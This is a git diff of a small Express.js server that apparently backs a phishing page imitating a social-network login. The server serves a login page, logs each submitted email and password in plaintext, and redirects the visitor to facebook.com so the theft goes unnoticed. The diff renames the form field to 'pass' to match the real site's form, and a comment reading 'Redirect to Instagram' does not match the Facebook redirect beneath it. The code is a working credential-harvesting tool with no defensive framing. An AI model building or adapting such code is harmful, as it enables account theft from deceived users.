@@ -11,30 +11,24 @@ app.use(express.static('public'));
 
 // Serve the login page when accessing the root URL
 app.get('/', (req, res) => {
-    console.log('Sending index page...');
-    res.sendFile(__dirname + '/public/index.html'); // Ensure the file path is correct
+    console.log('Sending login page...');
+    res.sendFile(__dirname + '/public/login.html'); // Ensure the file path is correct
 });
 
-// Serve the phone page
-app.get('/phone', (req, res) => {
-    console.log('Sending phone page...');
-    res.sendFile(__dirname + '/public/phone.html'); // Ensure the file path is correct
-});
-
-// Handle form submission from both pages
+// Handle form submission
 app.post('/login', (req, res) => {
     // Log the entire body to debug
     console.log('Form data received:', req.body);
 
-    // Extract email and password fields from the form data
-    const { email, password } = req.body;
-    if (email && password) {
-        console.log(`Received login request with email: ${email} and password: ${password}`);
+    // Extract email and pass fields from the form data
+    const { email, pass } = req.body;
+    if (email && pass) {
+        console.log(`Received login request with email: ${email} and password: ${pass}`);
     } else {
         console.log('Email or password is missing!');
     }
 
-    // Redirect to Facebook after processing
+    // Redirect to Instagram after processing
     res.redirect('https://www.facebook.com/'); // Change destination as needed
 });
 
